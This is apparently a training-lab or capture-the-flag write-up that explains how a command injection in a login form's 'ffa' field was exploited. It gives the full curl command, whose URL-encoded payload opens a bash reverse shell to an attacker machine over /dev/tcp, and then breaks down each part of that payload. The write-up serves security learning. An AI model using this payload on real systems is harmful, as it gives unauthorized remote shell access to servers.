Capstone Lab: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.

Command That got it
└─$ curl -X POST --data 'username=&password=&ffa=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.172%2F4444%200%3E%261%27%29' http://192.168.156.16/login

1. curl -X POST --data 'username=&password=&ffa=...

    curl: This is a command-line tool used to send HTTP requests.
    -X POST: Specifies that the HTTP request method is POST. This is typically used when sending data to the server (e.g., form submissions).
    --data 'username=&password=&ffa=...': This option sends the specified data in the POST request body. In this case, it includes three form fields:
        username: Set to an empty value.
        password: Set to an empty value.
        ffa: Contains the actual payload we are injecting to exploit the command injection vulnerability.

2. %24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.172%2F4444%200%3E%261%27%29

    The value of the ffa field is URL-encoded to ensure it is transmitted correctly over HTTP.

    URL-Decoded Equivalent:


    $(bash -c 'bash -i >& /dev/tcp/192.168.45.172/4444 0>&1')


3. $(...)

    The $(...) syntax is used to execute a command in a subshell. The output of the command inside the parentheses is returned and can be used in the script.
    In this case, $(bash -c '...') means "run the following command in a new Bash shell".

4. bash -c '...'

    bash -c '...': This tells Bash to execute the string provided in single quotes as a command. Here, we are running another Bash command within this context.

5. bash -i >& /dev/tcp/192.168.45.172/4444 0>&1

    bash -i: Starts an interactive Bash shell.
    >&: Redirects both the standard output (>) and standard error (&) to another location.
    /dev/tcp/192.168.45.172/4444: This is a special file in Unix-like systems that allows Bash to open a TCP connection. Here:
        192.168.45.172 is the IP address of your Kali machine (the attacker's machine).
        4444 is the port number on which your Netcat listener is waiting for a connection.
    0>&1: Redirects the standard input (0) to be the same as the standard output (1), essentially sending the input/output of the Bash shell over the TCP connection.

6. The Exploit in Action

    When this curl command is sent to the target server, it submits the form with the malicious payload.
    The payload is executed on the server due to the command injection vulnerability in the ffa field.
    This results in the server establishing a reverse shell connection back to your machine at 192.168.45.172:4444.
    You, as the attacker, receive an interactive shell on your machine through the Netcat listener, allowing you to execute commands on the target server.

Summary
This command exploits a command injection vulnerability by injecting a reverse shell payload into the ffa field.
When the server processes the form, it executes the payload, which opens a TCP connection to your machine and provides you with an interactive shell on the target server.
